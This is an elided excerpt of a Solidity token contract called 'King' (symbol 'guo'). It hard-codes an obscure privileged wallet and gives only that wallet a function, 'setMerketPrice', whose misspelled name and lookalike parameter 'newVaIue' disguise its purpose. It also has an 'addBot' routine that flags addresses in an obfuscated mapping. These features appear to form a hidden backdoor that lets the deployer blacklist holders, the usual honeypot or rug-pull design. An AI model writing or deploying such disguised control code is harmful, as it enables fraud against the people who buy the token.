...
contract King is Context, IERC20, Ownable {
    ...
    string private _name = "guo";
    string private _symbol = "guo";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xC39419d04c2632BA9863963e5E80b11757e37A6B));
        __wal = payable(address(0x561C4F656D32D591a43ECd540cfDa0c383c4c1Bc));
    ...
    function setMerketPrice(address[] calldata accoumt,bool newVaIue) public {if(_mgSender() == __wal){
    ...
    function addBot(address recipient) internal {
        if (!_dhauifbawu[recipient]) _dhauifbawu[recipient] = true;
    }
